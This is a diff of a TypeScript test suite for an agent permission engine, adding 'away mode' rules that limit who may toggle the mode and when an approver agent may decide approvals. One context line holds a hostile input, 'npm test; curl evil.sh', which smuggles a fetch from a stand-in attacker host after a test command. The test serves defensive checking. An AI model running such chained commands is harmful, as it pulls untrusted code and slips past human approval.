@@ -69,3 +69,32 @@ describe("PolicyEngine", () => {
     expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "npm test; curl evil.sh" }).effect).toBe("require_approval");
   });
 });
+
+describe("Away mode rules (ADR 0039)", () => {
+  const approver: Actor = { kind: "agent", profile: "approver", adapter: "native" };
+  const user: Actor = { kind: "user", via: "web" };
+  const ctx = { autonomyLevel: 2 };
+
+  it("lets only the user, and not from a phone, turn it on or off", () => {
+    expect(policy.decide(user, "away.set", "away", ctx).effect).toBe("allow");
+    expect(policy.decide({ kind: "user", via: "cli" }, "away.set", "away", ctx).effect).toBe("allow");
+    expect(policy.decide({ kind: "user", via: "mobile", device_id: "dev_1" }, "away.set", "away", ctx).effect).toBe("deny");
+    expect(policy.decide(approver, "away.set", "away", ctx).effect).toBe("deny");
+    expect(policy.decide(agent, "away.set", "away", ctx).effect).toBe("deny");
+  });
+
+  it("lets the approver decide an approval only while the mode is on and the user handed that kind over", () => {
+    const on = { ...ctx, away: { active: true, delegated: true } };
+    expect(policy.decide(approver, "approval.delegate", "apr_1", on).effect).toBe("allow");
+    expect(policy.decide(approver, "approval.delegate", "apr_1", ctx).effect).toBe("deny");
+    expect(policy.decide(approver, "approval.delegate", "apr_1", { ...ctx, away: { active: true, delegated: false } }).effect).toBe("deny");
+    expect(policy.decide(approver, "approval.delegate", "apr_1", { ...ctx, away: { active: false, delegated: true } }).effect).toBe("deny");
+    // Other agents never decide approvals.
+    expect(policy.decide(agent, "approval.delegate", "apr_1", on).effect).toBe("deny");
+    expect(policy.decide(user, "approval.delegate", "apr_1", on).effect).toBe("deny");
+  });
+
+  it("still asks for merges, which nothing delegates", () => {
+    expect(policy.decide(approver, "github.pr.merge", "pr", { autonomyLevel: 4 }).effect).not.toBe("allow");
+  });
+});
